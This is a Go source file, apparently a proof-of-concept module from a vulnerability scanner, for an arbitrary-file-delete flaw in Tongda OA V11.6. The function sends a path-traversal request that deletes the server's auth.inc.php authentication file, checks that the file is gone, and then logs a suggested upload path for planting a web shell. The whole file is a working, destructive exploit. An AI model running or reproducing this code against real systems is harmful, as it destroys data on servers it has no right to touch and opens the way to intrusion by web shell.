package tongda

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//version 通达 OA V11.6 任意文件删除
func File_delete(url string) bool{
	fmt.Println("This poc will DELETE auth.inc.php which may damage the OA!!!")
	if _, err := pkg.HttpRequset(url+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php", "GET", "", false, nil); err == nil {
		if req2, err:=pkg.HttpRequset(url+"/inc/auth.inc.php","GET","",false,nil); err == nil {
			if strings.Contains(req2.Body,"No input file specified."){
				pkg.GoPocLog(fmt.Sprintf("Found vuln tongda-OA anyFile_delete | \"%s\"\n", "you can try to /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/../../../ to upload your shell"))
			}
		}
	}
	return false
}
